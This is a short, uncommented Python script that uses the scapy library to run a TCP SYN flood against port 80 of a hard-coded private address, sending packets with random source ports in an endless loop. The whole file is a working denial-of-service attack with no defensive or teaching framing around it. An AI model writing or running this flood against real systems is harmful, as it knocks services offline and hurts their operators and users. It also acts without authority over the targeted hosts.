from scapy.all import *
import time

target_ip = "10.0.0.5"
target_port = 80

def syn_flood():
    while True:
        ip = IP(dst=target_ip)
        tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
        pkt = ip / tcp
        send(pkt, verbose=False)

if __name__ == '__main__':
    syn_flood()

